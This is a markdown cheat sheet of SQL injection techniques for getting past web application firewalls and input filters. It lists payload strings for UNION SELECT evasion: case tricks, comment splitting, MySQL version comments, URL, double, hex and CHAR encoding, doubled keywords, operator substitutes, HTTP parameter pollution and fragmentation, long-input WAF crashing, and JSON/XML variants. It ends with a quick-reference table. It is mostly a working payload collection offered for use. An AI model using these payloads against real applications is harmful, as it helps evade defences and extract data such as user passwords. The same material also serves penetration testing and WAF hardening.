# SQL Injection Filter Bypass

## Overview

Techniques to bypass WAF, filters, and input validation.

## Case Manipulation

```sql
SeLeCt
sElEcT
SELECT
select
```

## Comment Injection

### Inline Comments

```sql
SEL/*comment*/ECT
UNI/**/ON SEL/**/ECT
UN/**/ION/**/SEL/**/ECT
```

### MySQL Version Comments

```sql
/*!50000SELECT*/ * FROM users
/*!UNION*/ /*!SELECT*/ 1,2,3
/!50000UNION/ /!50000SELECT/ 1,2,3
```

## Whitespace Alternatives

### Standard Whitespace
```
Space: %20
Tab: %09
Newline: %0A
Carriage Return: %0D
Vertical Tab: %0B
Form Feed: %0C
```

### No Space Required

```sql
-- Using parentheses
(SELECT(username)FROM(users))
UNION(SELECT(1),(2),(3))

-- Using comments
UNION/**/SELECT/**/1,2,3
SELECT/**/password/**/FROM/**/users
```

## URL Encoding

### Single Encoding

```
' = %27
" = %22
# = %23
- = %2D
/ = %2F
\ = %5C
= = %3D
space = %20
```

### Double Encoding

```
' = %2527
" = %2522
< = %253C
> = %253E
```

### Mixed Encoding

```sql
%53ELECT    -- SELECT
%55NION     -- UNION
%73elect    -- select
```

## Hex Encoding

### MySQL

```sql
-- String as hex
SELECT 0x61646D696E  -- 'admin'
SELECT X'61646D696E'  -- 'admin'

-- Concat with hex
CONCAT(0x27,0x3D,0x27)  -- '='
```

### MSSQL

```sql
SELECT CONVERT(VARCHAR, 0x61646D696E)
```

## Char/ASCII Encoding

### MySQL

```sql
CHAR(97,100,109,105,110)  -- 'admin'
CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))
```

### MSSQL

```sql
CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)
```

### Oracle

```sql
CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
```

### PostgreSQL

```sql
CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
```

## Keyword Bypass

### Double Keywords (filter removes once)

```sql
UNunionION SEselectLECT
SELselectECT
ununionion selselectect
```

### Alternative Functions

| Blocked | Alternative |
|---------|-------------|
| `SUBSTRING` | `SUBSTR`, `MID`, `LEFT`, `RIGHT` |
| `ASCII` | `ORD`, `HEX` |
| `SLEEP` | `BENCHMARK`, heavy query |
| `AND` | `&&` |
| `OR` | `\|\|` |
| `=` | `LIKE`, `REGEXP`, `<>`, `!=` |
| `CONCAT` | `CONCAT_WS`, `\|\|` |

### Scientific Notation

```sql
1e0UNION SELECT 1,2
1.0UNION SELECT 1,2
```

## Quote Bypass

### No Quotes Needed

```sql
-- Using hex
SELECT * FROM users WHERE name=0x61646D696E

-- Using CHAR
SELECT * FROM users WHERE name=CHAR(97,100,109,105,110)

-- Numeric context
SELECT * FROM users WHERE id=1
```

### Quote Escaping

```sql
\'  -- Escaped single quote
''  -- Double single quote (SQL escape)
```

## AND/OR Bypass

```sql
-- Alternative operators
1 && 1          -- AND
1 || 1          -- OR (MySQL for string concat, logical in some contexts)

-- Using math
1 DIV 1         -- True
1 MOD 1         -- 0

-- Using comparison
1 LIKE 1
1 REGEXP 1
1 BETWEEN 0 AND 2
```

## Equals Sign Bypass

```sql
-- Using LIKE
'admin' LIKE 'admin'

-- Using REGEXP
'admin' REGEXP '^admin$'

-- Using comparison operators
NOT ('admin' <> 'admin')
NOT ('admin' != 'admin')

-- Using IN
'admin' IN ('admin')

-- Using BETWEEN
id BETWEEN 1 AND 1
```

## HTTP Parameter Pollution (HPP)

Split payload across multiple parameters:

```
# Original blocked:
?id=1 UNION SELECT 1,2,3

# HPP bypass (ASP/IIS concatenates):
?id=1 UNION SELECT 1&id=,2&id=,3
```

Server behavior varies:
| Platform | Behavior |
|----------|----------|
| ASP/IIS | Last value or concatenation |
| PHP/Apache | Last value |
| JSP | First value |

## HTTP Parameter Fragmentation (HPF)

Use application's query structure:

```sql
# Vulnerable code: "SELECT * FROM t WHERE a=".$_GET['a']." AND b=".$_GET['b']

# Normal blocked:
?a=1 UNION SELECT 1,2

# HPF bypass:
?a=1 UNION/*&b=*/SELECT 1,2
# Results in: SELECT * FROM t WHERE a=1 UNION/* AND b=*/SELECT 1,2
```

## WAF Bypass Strings

### UNION SELECT Bypasses

```sql
/*!50000UNION*//*!50000SELECT*/
+union+distinct+select+
+union+distinctROW+select+
un/**/ion+sel/**/ect
%55nion(%53elect)
+#uNiOn+#sEleCt
uni%0bon+se%0blect
UNION%23foo*%2F*bar%0ASELECT
```

### Common Bypass Patterns

```sql
-- Newline injection
UNION%0ASELECT
UNION%0D%0ASELECT

-- Tab injection  
UNION%09SELECT

-- Comment variations
UNION--+%0ASELECT
UNION#%0ASELECT
```

## Buffer Overflow WAF

Some WAFs crash on long input:

```sql
?id=1 AND (SELECT 1)=(SELECT 0xAAAAA[repeat 1000+ times])+UNION+SELECT+1,2,3--
```

## JSON/XML Context

### JSON Injection

```json
{"id": "1 UNION SELECT 1,2,3--"}
{"id": "1' UNION SELECT 1,2,3--'"}
```

### XML Escape Sequences

```xml
<id>1 &#x55;NION SELECT 1,2,3</id>
<id>1 &#85;NION SELECT 1,2,3</id>
```

## Quick Reference

| Technique | Example |
|-----------|---------|
| Case | `UnIoN sElEcT` |
| Comments | `UN/**/ION SEL/**/ECT` |
| URL Encode | `%55NION %53ELECT` |
| Double Encode | `%2555NION` |
| Hex | `0x61646D696E` |
| Char | `CHAR(97,100,109,105,110)` |
| No Space | `UNION(SELECT(1))` |
| Newline | `UNION%0ASELECT` |
| Double Keyword | `UNunionION` |
